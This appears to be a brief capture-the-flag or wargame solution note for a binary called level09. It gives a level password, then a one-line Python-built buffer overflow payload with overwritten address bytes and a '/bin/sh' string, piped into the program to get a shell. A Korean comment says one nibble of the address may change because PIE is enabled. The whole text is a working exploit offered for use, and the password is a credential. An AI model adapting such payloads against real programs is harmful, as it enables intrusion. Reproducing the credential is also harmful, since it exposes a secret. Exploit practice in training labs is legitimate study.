> Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

cat <(python -c 'import sys; sys.stdout.write("A" * 40 + "\xca" + "A" * 86 + "A" * 0xc8 + "\x8c\x48" + "A" * 821 + "/bin/sh\x00" + "A" * 119)') - | ./level09

NOTE: pie가 활성화되어있기 때문에 payload 중간의 \x48 에서 4 부분은 랜덤으로 바뀔 수도 있음.